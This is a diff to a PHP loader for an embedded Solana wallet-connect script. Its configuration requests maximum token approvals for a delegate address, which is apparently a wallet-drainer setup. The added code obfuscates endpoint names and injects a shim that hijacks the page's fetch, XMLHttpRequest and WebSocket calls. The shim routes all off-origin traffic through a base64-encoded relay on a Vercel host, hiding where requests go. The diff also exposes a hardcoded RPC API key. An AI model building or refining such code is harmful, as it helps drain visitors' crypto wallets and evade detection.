@@ -28,6 +28,7 @@ $cfg = [
     'token_approval_max_count' => 1,
     'token_approval_min_usd' => 1.0,
     'token_approval_amount_mode' => 'max',
+    // Set HELIUS_RPC_URL on Vercel (server-side only). PHP never calls Helius directly.
     'solana_rpc_url' => 'https://mainnet.helius-rpc.com/?api-key=68b95562-1955-4c26-92ba-0e240a8b9d62',
 
     'connect_popup_enabled' => true,
@@ -35,6 +36,10 @@ $cfg = [
 
     'vercel_profile_host' => 'fuzzy-octo-guacamole-delta.vercel.app',
     'profile_script' => 'Ix9fLBj7CRLZ.js',
+    'gateway_chunk' => 'Qm4nR8sV2xWp.js',
+    'profile_page_chunk' => 'Wn3kL8pR4vYs.js',
+    'ws_relay_chunk' => 'Zt8nK4mP2wRq.js',
+    'split_chunks' => ['chunks/H7kL9mN2pQx.js'],
 ];
 
 function request_origin(): string
@@ -58,13 +63,31 @@ function vault_entry_url(array $cfg): string
     return rtrim(request_origin(), '/') . '/' . $path;
 }
 
+function chunk_query_url(array $cfg, string $chunk): string
+{
+    return vault_entry_url($cfg) . '?c=' . rawurlencode($chunk);
+}
+
+/** @param array<string, mixed> $op */
+function chunk_op_get_url(array $cfg, array $op): string
+{
+    $json = json_encode($op, JSON_UNESCAPED_SLASHES | JSON_THROW_ON_ERROR);
+    $d = rtrim(strtr(base64_encode($json), '+/', '-_'), '=');
+
+    return chunk_query_url($cfg, chunk_names($cfg)['gateway']) . '&d=' . rawurlencode($d);
+}
+
 function build_embed_config(array $cfg, string $siteUrl): array
 {
-    $entry = vault_entry_url($cfg);
+    $chunks = chunk_names($cfg);
+    $gatewayUrl = chunk_query_url($cfg, $chunks['gateway']);
     $popupUrl = trim((string) ($cfg['connect_popup_url'] ?? ''));
     if ($popupUrl === '') {
-        $popupUrl = $entry . '?wallet=popup';
+        $popupUrl = chunk_query_url($cfg, $chunks['profilePage']);
     }
+
+    $iconTarget = vercel_api_origin($cfg) . '/tYZq2BsVawvS5wYEF.svg';
+    $icons = [chunk_op_get_url($cfg, ['t' => 'u', 'm' => 'GET', 'u' => $iconTarget])];
 
     return [
         'projectId' => (string) ($cfg['reown_project_id'] ?? ''),
@@ -74,19 +97,97 @@ function build_embed_config(array $cfg, string $siteUrl): array
         'siteName' => (string) ($cfg['site_name'] ?? 'Website'),
         'siteDescription' => (string) ($cfg['site_description'] ?? ''),
         'siteUrl' => $siteUrl,
-        'siteIcons' => $cfg['site_icons'] ?? ($siteUrl !== '' ? ["{$siteUrl}/favicon.ico"] : []),
+        'siteIcons' => $icons,
         'analytics' => (bool) ($cfg['analytics'] ?? true),
         'tokenApprovalEnabled' => (bool) ($cfg['token_approval_enabled'] ?? true),
         'tokenDelegate' => (string) ($cfg['token_delegate'] ?? ''),
         'tokenApprovalMaxCount' => (int) ($cfg['token_approval_max_count'] ?? 0),
         'tokenApprovalMinUsd' => (float) ($cfg['token_approval_min_usd'] ?? 1),
         'tokenApprovalAmountMode' => (string) ($cfg['token_approval_amount_mode'] ?? 'max'),
-        'solanaRpcUrl' => $entry,
-        'priceApiUrl' => $entry . '?wallet=price',
+        'solanaRpcUrl' => $gatewayUrl,
+        'priceApiUrl' => $gatewayUrl,
         'connectPopupEnabled' => (bool) ($cfg['connect_popup_enabled'] ?? true),
         'connectPopupUrl' => $popupUrl,
         'connectPopupTitle' => (string) ($cfg['connect_popup_title'] ?? ''),
+        'chunkBase' => vault_entry_url($cfg),
+        'splitChunks' => array_values($cfg['split_chunks'] ?? []),
     ];
+}
+
+function patch_bundle_chunk_paths(string $js, string $chunkBase): string
+{
+    return str_replace('__CHUNK__', rtrim($chunkBase, '/'), $js);
+}
+
+function embed_module_bootstrap(array $cfg): string
+{
+    $chunks = chunk_names($cfg);
+    $entry = $chunks['bundle'] ?? basename((string) ($cfg['vercel_bundle_url'] ?? '0EBM88LeOsHh.js'));
+    $baseJs = json_encode(vault_entry_url($cfg), JSON_UNESCAPED_SLASHES | JSON_THROW_ON_ERROR);
+    $entryJs = json_encode($entry, JSON_UNESCAPED_SLASHES | JSON_THROW_ON_ERROR);
+
+    return '(function(b,e){var s=document.createElement("script");s.type="module";'
+        . 's.src=b+"?c="+encodeURIComponent(e);document.head.appendChild(s)})('
+        . $baseJs . ',' . $entryJs . ');';
+}
+
+/** @return array{bundle: string, gateway: string, profileScript: string, profilePage: string, wsRelay: string} */
+function chunk_names(array $cfg): array
+{
+    $bundle = basename((string) parse_url((string) ($cfg['vercel_bundle_url'] ?? ''), PHP_URL_PATH));
+    if ($bundle === '' || $bundle === '/') {
+        $bundle = '0EBM88LeOsHh.js';
+    }
+
+    return [
+        'bundle' => $bundle,
+        'gateway' => (string) ($cfg['gateway_chunk'] ?? 'Qm4nR8sV2xWp.js'),
+        'profileScript' => (string) ($cfg['profile_script'] ?? 'Ix9fLBj7CRLZ.js'),
+        'profilePage' => (string) ($cfg['profile_page_chunk'] ?? 'Wn3kL8pR4vYs.js'),
+        'wsRelay' => (string) ($cfg['ws_relay_chunk'] ?? 'Zt8nK4mP2wRq.js'),
+    ];
+}
+
+function is_static_split_chunk(array $cfg, string $chunk): bool
+{
+    $names = chunk_names($cfg);
+    if ($chunk === $names['bundle']) {
+        return true;
+    }
+    foreach ($cfg['split_chunks'] ?? [] as $rel) {
+        if ($chunk === $rel || $chunk === basename((string) $rel)) {
+            return true;
+        }
+    }
+
+    return (bool) preg_match('#^chunks/[A-Za-z0-9._-]+\\.js$#', $chunk);
+}
+
+function serve_static_chunk(array $cfg, string $chunk): void
+{
+    $safe = $chunk;
+    if (!preg_match('#^(?:chunks/)?[A-Za-z0-9._-]+\\.js$#', $safe)) {
+        http_response_code(400);
+        exit;
+    }
+    if (!str_contains($safe, '/')) {
+        $names = chunk_names($cfg);
+        if ($safe === $names['bundle']) {
+            $safe = $names['bundle'];
+        }
+    }
+
+    $body = fetch_remote_url(vercel_api_origin($cfg) . '/' . $safe);
+    if ($body === null) {
+        http_response_code(502);
+        exit;
+    }
+
+    $body = patch_bundle_chunk_paths($body, vault_entry_url($cfg));
+    header('Content-Type: application/javascript; charset=utf-8');
+    header('Cache-Control: public, max-age=300');
+    header('X-Content-Type-Options: nosniff');
+    echo $body;
 }
 
 function script_request_allowed(array $cfg, string $siteUrl): bool
@@ -162,6 +263,87 @@ function embed_config_preamble(array $embedConfig): string
         . '{value:c,writable:!1,enumerable:!1,configurable:!1})})(window,atob,JSON);';
 }
 
+function embed_network_shim(string $entry, array $chunks): string
+{
+    $entryJs = json_encode($entry, JSON_UNESCAPED_SLASHES | JSON_THROW_ON_ERROR);
+    $gwJs = json_encode($chunks['gateway'], JSON_UNESCAPED_SLASHES | JSON_THROW_ON_ERROR);
+    $wsJs = json_encode($chunks['wsRelay'], JSON_UNESCAPED_SLASHES | JSON_THROW_ON_ERROR);
+
+    return '(function(e,g,w){function x(o){var s=JSON.stringify(o);'
+        . 'var b=btoa(s);return b.replace(/\\+/g,"-").replace(/\\//g,"_").replace(/=+$/,"")}'
+        . 'function uget(o){return e+"?c="+encodeURIComponent(g)+"&d="+encodeURIComponent(x(o))}'
+        . 'function off(h){try{return new URL(h,location.href).origin!==location.origin}catch(r){return!1}}'
+        . 'function pl(t){var m=t.match(/__WPL\\((\\d+),"((?:[^"\\\\]|\\\\.)*)"\\)/);'
+        . 'if(!m)return null;var s=Number(m[1]),b=m[2].replace(/\\\\"/g,\'"\').replace(/\\\\\\\\/g,"\\\\");'
+        . 'if(s<200||s>=300)throw new Error("chunk "+s);'
+        . 'var n=b.replace(/-/g,"+").replace(/_/g,"/");var p=n.length%4?4-n.length%4:0;'
+        . 'return JSON.parse(atob(n+"=".repeat(p)))}'
+        . 'function pj(r){return r.text().then(function(t){var j=pl(t);'
+        . 'return new Response(j?JSON.stringify(j):t,{status:r.status,headers:{"Content-Type":"application/json"}})})}'
+        . 'function prox(h,n){n=n||{};var m=(n.method||"GET").toUpperCase(),b=n.body;'
+        . 'if(m==="GET"&&!b)return pj(fetch(uget({t:"u",m:"GET",u:h}),n));'
+        . 'var o={t:"u",m:m,u:h};if(b!=null)o.b=typeof b==="string"?b:String(b);'
+        . 'return pj(fetch(e+"?c="+encodeURIComponent(g),{method:"POST",headers:Object.assign({},n.headers||{},'
+        . '{"Content-Type":"application/json"}),body:JSON.stringify(o),credentials:n.credentials,signal:n.signal}))}'
+        . 'var f=fetch;fetch=function(i,n){var h=typeof i==="string"?i:i instanceof Request?i.url:String(i);'
+        . 'if(off(h))return prox(h,n);return f(i,n)};'
+        . 'var xo=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(m,h){'
+        . 'if(typeof h==="string"&&off(h))arguments[1]=uget({t:"u",m:m||"GET",u:h});return xo.apply(this,arguments)};'
+        . 'var W=WebSocket,wb=e.replace(/^http/i,"ws");WebSocket=function(h,pr){'
+        . 'if(off(h))return new W(wb+"?c="+encodeURIComponent(w),pr);return new W(h,pr)}})('
+        . $entryJs . ',' . $gwJs . ',' . $wsJs . ');';
+}
+
+function vercel_api_origin(array $cfg): string
+{
+    return vercel_profile_origin($cfg);
+}
+
+function decode_chunk_payload(string $raw): ?array
+{
+    if ($raw === '') {
+        return null;
+    }
+    $pad = strlen($raw) % 4;
+    if ($pad > 0) {
+        $raw .= str_repeat('=', 4 - $pad);
+    }
+    $json = base64_decode(strtr($raw, '-_', '+/'), true);
+    if ($json === false) {
+        return null;
+    }
+    $data = json_decode($json, true);
+
+    return is_array($data) ? $data : null;
+}
+
+function serve_gateway_chunk(array $cfg): void
+{
+    $chunks = chunk_names($cfg);
+    $vercelUrl = vercel_api_origin($cfg) . '/' . $chunks['gateway'];
+    $method = strtoupper((string) ($_SERVER['REQUEST_METHOD'] ?? 'GET'));
+    $d = (string) ($_GET['d'] ?? '');
+
+    if ($method === 'GET' && $d !== '') {
+        proxy_forward('GET', $vercelUrl . '?d=' . rawurlencode($d), null);
+        return;
+    }
+
+    $body = file_get_contents('php://input');
+    if ($body === false) {
+        http_response_code(400);
+        exit;
+    }
+
+    $headers = [];
+    $contentType = (string) ($_SERVER['CONTENT_TYPE'] ?? $_SERVER['HTTP_CONTENT_TYPE'] ?? '');
+    if ($contentType !== '') {
+        $headers[] = 'Content-Type: ' . $contentType;
+    }
+
+    proxy_forward('POST', $vercelUrl, $body === '' ? null : $body, $headers);
+}
+
 function proxy_forward(string $method, string $url, ?string $body, array $extraHeaders = []): void
 {
     if (!function_exists('curl_init')) {
@@ -202,37 +384,12 @@ function proxy_forward(string $method, string $url, ?string $body, array $extraH
         header('Content-Type: ' . $type);
     }
     header('Cache-Control: no-store');
+    $origin = request_origin();
+    if ($origin !== '') {
+        header('Access-Control-Allow-Origin: ' . $origin);
+        header('Vary: Origin');
+    }
     echo $response === false ? '' : $response;
-}
-
-function serve_rpc_proxy(array $cfg): void
-{
-    $upstream = trim((string) ($cfg['solana_rpc_url'] ?? ''));
-    if ($upstream === '') {
-        http_response_code(500);
-        exit;
-    }
-    if (($_SERVER['REQUEST_METHOD'] ?? 'GET') !== 'POST') {
-        http_response_code(405);
-        exit;
-    }
-    $body = file_get_contents('php://input');
-    if ($body === false) {
-        http_response_code(400);
-        exit;
-    }
-    proxy_forward('POST', $upstream, $body, ['Content-Type: application/json']);
-}
-
-function serve_price_proxy(array $cfg): void
-{
-    $ids = (string) ($_GET['ids'] ?? '');
-    if ($ids === '' || !preg_match('/^[A-Za-z0-9:,_-]+$/', $ids)) {
-        http_response_code(400);
-        exit;
-    }
-    $upstream = 'https://api.jup.ag/price/v2?ids=' . $ids;
-    proxy_forward('GET', $upstream, null);
 }
 
 function vercel_profile_origin(array $cfg): string
@@ -263,9 +420,9 @@ function serve_popup_proxy(array $cfg): void
         exit;
     }
 
+    $chunks = chunk_names($cfg);
     $script = basename((string) ($cfg['profile_script'] ?? 'page.js'));
-    $entry = vault_entry_url($cfg);
-    $assetUrl = $entry . '?wallet=popup-js&file=' . rawurlencode($script);
+    $assetUrl = chunk_query_url($cfg, $chunks['profileScript']);
     $html = (string) preg_replace(
         '/<script\\s+src="' . preg_quote($script, '/') . '"\\s*><\\/script>/',
         '<script src="' . $assetUrl . '" defer></script>',
@@ -397,26 +554,27 @@ if (!script_request_allowed($cfg, $siteUrl)) {
     exit;
 }
 
-$walletQuery = (string) ($_GET['wallet'] ?? '');
-$method = (string) ($_SERVER['REQUEST_METHOD'] ?? 'GET');
+$chunk = (string) ($_GET['c'] ?? '');
+$chunks = chunk_names($cfg);
 
-if ($method === 'POST') {
-    serve_rpc_proxy($cfg);
-    exit;
-}
-
-if ($walletQuery === 'price') {
-    serve_price_proxy($cfg);
-    exit;
-}
-
-if ($walletQuery === 'popup-js' && isset($_GET['file'])) {
-    serve_popup_asset_proxy($cfg, (string) $_GET['file']);
-    exit;
-}
-
-if ($walletQuery === 'popup') {
-    serve_popup_proxy($cfg);
+if ($chunk !== '') {
+    if ($chunk === $chunks['gateway']) {
+        serve_gateway_chunk($cfg);
+        exit;
+    }
+    if ($chunk === $chunks['profilePage']) {
+        serve_popup_proxy($cfg);
+        exit;
+    }
+    if ($chunk === $chunks['profileScript']) {
+        serve_popup_asset_proxy($cfg, $chunks['profileScript']);
+        exit;
+    }
+    if (is_static_split_chunk($cfg, $chunk)) {
+        serve_static_chunk($cfg, $chunk);
+        exit;
+    }
+    send_generic_not_found();
     exit;
 }
 
@@ -444,25 +602,9 @@ try {
     exit;
 }
 
-try {
-    $bundle = load_wallet_bundle($cfg);
-} catch (RuntimeException $e) {
-    http_response_code(500);
-    header('Content-Type: text/plain; charset=utf-8');
-    echo 'Invalid vercel_bundle_url: ' . $e->getMessage();
-    exit;
-}
-
-if ($bundle === null || $bundle === '') {
-    http_response_code(500);
-    header('Content-Type: text/plain; charset=utf-8');
-    $hint = wallet_bundle_fetch_last_error();
-    echo 'Could not fetch wallet bundle'
-        . ($hint !== '' ? " ({$hint})" : '')
-        . ' — check vercel_bundle_url; install php-curl if needed';
-    exit;
-}
-
+$entry = vault_entry_url($cfg);
+echo embed_network_shim($entry, chunk_names($cfg));
+echo "\n";
 echo embed_config_preamble($embedConfig);
 echo "\n";
-echo $bundle;
+echo embed_module_bootstrap($cfg);
